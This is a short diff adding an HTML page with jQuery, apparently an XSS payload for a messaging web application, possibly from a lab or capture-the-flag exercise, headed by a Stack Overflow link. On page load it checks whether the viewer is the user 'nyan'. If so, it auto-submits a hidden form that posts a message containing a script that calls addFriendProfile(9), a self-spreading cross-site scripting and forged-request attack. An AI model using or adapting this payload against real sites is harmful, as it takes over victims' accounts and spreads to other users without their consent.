@@ -1,0 +1,15 @@
+https://stackoverflow.com/questions/16884072/jquery-instead-of
+
+<form id="sendXSS_form" method="post" action="/inside/message/send/1">
+    <input type="text" id="sendXSS_input" name="message">
+</form>
+
+<script>
+    $(document).ready(function() {
+        if (window.authUserName === 'nyan') {
+            let script_message = "<script> function f() { addFriendProfile(9); } $(f); <\/script>";
+            $('#sendXSS_input').val(script_message);
+            $('#sendXSS_form').submit();
+        }
+    });
+</script>
